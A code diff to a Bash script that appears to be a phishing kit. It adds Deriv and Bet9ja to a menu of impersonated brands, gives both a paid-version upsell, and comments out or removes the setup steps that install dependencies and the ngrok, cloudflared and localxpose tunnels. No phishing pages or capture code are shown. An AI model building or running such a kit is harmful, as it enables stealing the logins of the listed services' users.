@@ -483,6 +483,7 @@ main_menu() {
 		${RED}[${CYAN}10${RED}]${BLUE} Tiktok        ${RED}[${CYAN}20${RED}]${ORANGE} Adobe        ${RED}[${CYAN}30${RED}]${BLUE} XBOX
 		${RED}[${CYAN}31${RED}]${BLUE} Mediafire     ${RED}[${CYAN}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${BLUE} Github
 		${RED}[${CYAN}34${RED}]${BLUE} Discord       ${RED}[${CYAN}35${RED}]${ORANGE} Crypto_Wallets "(testting)"
+		${RED}[${CYAN}36${RED}]${BLUE} Deriv         ${RED}[${CYAN}37${RED}]${ORANGE} Bet9ja
 
 		${RED}[${ORANGE}99${RED}]${GREEM} ABOUT         ${RED}[${ORANGE}00${RED}]${GREEN} Exit
 
@@ -585,6 +586,10 @@ main_menu() {
                         echo -ne "${GREEN}Try out the ${BLUE} Paid version to enjoy unlimited ${RED}acsess";;
                 35)
                         echo -ne "${GREEN}Try out the ${BLUE} Paid version to enjoy unlimited ${RED}acsess";;
+                36)
+                        echo -ne "${GREEN}Try out the ${BLUE} Paid version to enjoy unlimited ${RED}acsess";;
+                37)
+                        echo -ne "${GREEN}Try out the ${BLUE} Paid version to enjoy unlimited ${RED}acsess";;
                 99)
                         about;;
                 0 | 00 )
@@ -598,9 +603,8 @@ main_menu() {
 
 ## Main
 kill_pid
-dependencies
-install_ngrok
-install_cloudflared
-install_localxpose
+#dependencies
+#install_cloudflared
+#install_localxpose
 main_menu
 
